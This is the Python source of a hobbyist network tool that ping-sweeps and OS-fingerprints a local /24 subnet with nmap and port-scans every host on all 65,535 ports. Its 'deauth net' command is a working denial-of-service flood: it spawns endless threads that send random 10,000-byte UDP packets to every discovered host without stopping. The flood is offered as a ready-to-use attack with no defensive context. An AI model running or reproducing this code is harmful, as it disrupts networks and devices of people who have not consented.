import threading
import platform
import socket
import random
import nmap
import sys
import os

banner = """
 /$$   /$$             /$$                                       /$$             /$$$$$$$$                  /$$
| $$$ | $$            | $$                                      | $$            |__  $$__/                 | $$
| $$$$| $$  /$$$$$$  /$$$$$$   /$$  /$$  /$$  /$$$$$$   /$$$$$$ | $$   /$$         | $$  /$$$$$$   /$$$$$$ | $$
| $$ $$ $$ /$$__  $$|_  $$_/  | $$ | $$ | $$ /$$__  $$ /$$__  $$| $$  /$$/         | $$ /$$__  $$ /$$__  $$| $$
| $$  $$$$| $$$$$$$$  | $$    | $$ | $$ | $$| $$  \ $$| $$  \__/| $$$$$$/          | $$| $$  \ $$| $$  \ $$| $$
| $$\  $$$| $$_____/  | $$ /$$| $$ | $$ | $$| $$  | $$| $$      | $$_  $$          | $$| $$  | $$| $$  | $$| $$
| $$ \  $$|  $$$$$$$  |  $$$$/|  $$$$$/$$$$/|  $$$$$$/| $$      | $$ \  $$         | $$|  $$$$$$/|  $$$$$$/| $$
|__/  \__/ \_______/   \___/   \_____/\___/  \______/ |__/      |__/  \__/         |__/ \______/  \______/ |__/
"""

help_menu = """
🔧 Command          |      Description
════════════════════════════════════════════════════════
    help            | ❓ Display help menu
    exit            | 🚪 Exit program
    update          | 🔄 Update program
    clear           | 🧹 Clear screen
    simple net scan | 🌐 IP - MAC
    adv net scan    | 🔍 IP - MAC - OS INFO
    deauth net      | 🚫 Disconnect all devices from net
    port scan       | 🔍 1-65535 open port scan
════════════════════════════════════════════════════════
"""


def set_console_title(title):
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        print(f"\033]0;{title}\007")


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def simple_net_scan():
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts='192.168.1.0/24', arguments='-sn')

        def thread_scan(host):
            mac = nm[host]['addresses'].get('mac', 'N/A')
            print(f"{host} - {mac}")

        for host in nm.all_hosts():
            thread = threading.Thread(target=thread_scan, args=(host,))
            thread.start()

    except Exception as e:
        print(f"Error: {e}")


def adv_net_scan():
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts='192.168.1.0/24', arguments='-O')

        def thread_scan(host):
            mac = nm[host]['addresses'].get('mac', 'N/A')
            os_name = nm[host]['osmatch'][0]['name'] if 'osmatch' in nm[host] and nm[host][
                'osmatch'] else "Unknown"

            print(f"{host} - {mac} - {os_name}")

        for host in nm.all_hosts():
            thread = threading.Thread(target=thread_scan, args=(host,))
            thread.start()

    except Exception as e:
        print(f"Error: {e}")


def deauth(host):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            payload = random.randbytes(10000)
            client_socket.sendto(payload, (host, 65535))
            print("<-- Sent! -->", host)
        except Exception as e:
            print(e)


def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)

    try:
        sock.connect((ip, port))
        print(f"[+] {ip}:{port}")
    except socket.error:
        pass
    finally:
        sock.close()


def scan_all_ports(ip):
    for port in range(1, 65536):
        thread = threading.Thread(target=scan_port, args=(ip, port))
        thread.start()


if __name__ == '__main__':
    clear()
    set_console_title("NT by Bt08s")
    print(banner)

    while True:
        cmd = input("nt> ")
        cmd = cmd.lower()

        if cmd in ["help", "?"]:
            print(help_menu)
        elif cmd == "exit":
            sys.exit()
        elif cmd == "update":
            print("Soon.")
        elif cmd == "clear":
            clear()
        elif cmd == "simple net scan":
            simple_net_scan()
        elif cmd == "adv net scan":
            adv_net_scan()

        elif cmd == "deauth net":
            nm = nmap.PortScanner()
            print("Scanning devices...\n")
            nm.scan(hosts='192.168.1.0/24', arguments='-sn')
            print(f"Found {len(nm.all_hosts())}")

            while True:
                for host in nm.all_hosts():
                    thread = threading.Thread(target=deauth, args=(host,))
                    thread.start()

        elif cmd == "port scan":
            nm = nmap.PortScanner()
            print("Scanning devices...")
            nm.scan(hosts='192.168.1.0/24', arguments='-sn')
            for host in nm.all_hosts():
                thread = threading.Thread(target=scan_all_ports, args=(host,))
                thread.start()

        elif len(cmd) > 0:
            print("Invalid command. Type ? for help.")
